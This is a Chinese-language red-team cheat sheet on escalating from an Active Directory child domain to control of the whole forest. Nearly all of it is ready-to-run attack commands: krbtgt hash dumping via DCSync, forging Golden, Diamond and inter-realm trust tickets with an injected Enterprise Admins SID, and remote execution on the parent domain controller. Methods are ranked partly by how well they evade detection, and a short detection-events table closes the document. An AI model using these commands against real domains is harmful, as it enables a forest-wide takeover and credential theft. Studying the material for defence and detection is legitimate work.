# 子域到父域提权详解

## 概述

森林内父子域信任是自动创建的双向传递信任，且无 SID 过滤。子域 krbtgt 签发的票据可注入父域 Enterprise Admins SID (-519)，从而控制整个森林。

---

## 方法一: Golden Ticket + ExtraSid

### 步骤 1: 获取域 SID

```bash
lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC> 0
# Child SID: S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX

lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<PARENT_DC> 0
# Parent SID: S-1-5-21-YYYYYYYYY-YYYYYYYYY-YYYYYYYYY
# Enterprise Admins = Parent SID + "-519"
```

### 步骤 2: 转储子域 krbtgt

```bash
secretsdump.py -just-dc-user '<CHILD_DOMAIN>/krbtgt' \
  '<CHILD_DOMAIN>/Administrator:<PASSWORD>@<CHILD_DC>'
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
```

### 步骤 3: 创建并使用 Golden Ticket

```bash
ticketer.py -nthash <KRBTGT_NTHASH> \
  -domain-sid '<CHILD_SID>' \
  -domain <CHILD_DOMAIN> \
  -extra-sid '<PARENT_SID>-519' \
  fakeadmin

export KRB5CCNAME=fakeadmin.ccache
secretsdump.py -k -no-pass <PARENT_DOMAIN>/fakeadmin@<PARENT_DC>
psexec.py -k -no-pass <PARENT_DOMAIN>/fakeadmin@<PARENT_DC>
```

```powershell
# Rubeus - AES256 (更隐蔽)
Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator \
  /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<PARENT_SID>-519 /nowrap

# Rubeus - NTLM (直接注入)
Rubeus.exe golden /rc4:<KRBTGT_NTLM> /user:Administrator \
  /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<PARENT_SID>-519 /ptt
```

---

## 方法二: Diamond Ticket

修改合法 TGT 的 PAC 字段而非从零伪造。票据基础结构来自 KDC 合法签发，绕过部分检测。

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /groups:519 /sids:<PARENT_SID>-519 /krbkey:<KRBTGT_AES256> /nowrap
```

| 参数 | 用途 |
|------|------|
| /tgtdeleg | 通过委派获取合法 TGT |
| /ticketuser | PAC 中的目标用户名 |
| /groups | 注入的组 RID (519 = Enterprise Admins) |
| /krbkey | 子域 krbtgt AES256 密钥 |

---

## 方法三: raiseChild.py 自动化

Impacket 的 raiseChild.py 自动完成: 获取 SID -> DCSync krbtgt -> 构造票据 -> 认证父域。

```bash
raiseChild.py -target-exec <PARENT_DC> '<CHILD_DOMAIN>/Administrator:<PASSWORD>'
raiseChild.py -target-exec <PARENT_DC> -hashes :<NTHASH> '<CHILD_DOMAIN>/Administrator'
proxychains4 -q raiseChild.py -target-exec <PARENT_DC> '<CHILD_DOMAIN>/Administrator:<PASSWORD>'
```

注意: 自动化日志特征明显，失败时建议手动分步执行以定位问题。

---

## 方法四: Trust Ticket (Inter-Realm TGT)

使用域间信任密钥而非 krbtgt 伪造跨域 TGT。

```bash
# 转储信任密钥
secretsdump.py '<CHILD_DOMAIN>/Administrator:<PASSWORD>@<CHILD_DC>' | grep -i trust

# 伪造跨域 TGT
ticketer.py -nthash <TRUST_KEY_HASH> \
  -domain-sid '<CHILD_SID>' \
  -domain <CHILD_DOMAIN> \
  -spn krbtgt/<PARENT_DOMAIN> \
  fakeuser

export KRB5CCNAME=fakeuser.ccache
getST.py -k -no-pass -spn cifs/<PARENT_DC>.<PARENT_DOMAIN> <PARENT_DOMAIN>/fakeuser
```

---

## 方法对比

| 方法 | 隐蔽性 | 复杂度 | 前提条件 | 适用场景 |
|------|--------|--------|----------|----------|
| **Golden Ticket + ExtraSid** | 中 | 中 | krbtgt hash | 标准提权路径 |
| **Diamond Ticket** | 高 | 高 | krbtgt AES256 | 需要绕过检测 |
| **raiseChild.py** | 低 | 低 | DA 密码/哈希 | 快速验证/CTF |
| **Trust Ticket** | 中 | 高 | 信任密钥 | krbtgt 不可用时替代 |

### 选择建议

```
需要快速完成?
├─ 是 ── raiseChild.py
└─ 否
    ├─ 需要隐蔽? ── Diamond Ticket
    ├─ 标准路径 ──── Golden Ticket + ExtraSid
    └─ 没有 krbtgt ─ Trust Ticket
```

---

## 关键概念

### Enterprise Admins (-519)

- 仅存在于森林根域，格式: `S-1-5-21-<PARENT_SID>-519`
- 成员对森林内所有域拥有完全控制权

### 为什么森林内无 SID 过滤

- WITHIN_FOREST (0x20) 信任不启用过滤
- 森林 (非域) 是 AD 的安全边界

---

## 检测指标

| 事件 ID | 描述 | 关注点 |
|---------|------|--------|
| 4769 | Kerberos 服务票据请求 | 跨域票据含异常 SID |
| 4624 | 登录事件 | Enterprise Admin 从子域登录 |
| 4662 | 目录服务访问 | 子域发起 DCSync |
| 4672 | 特殊权限登录 | 子域账户获取 EA 特权 |
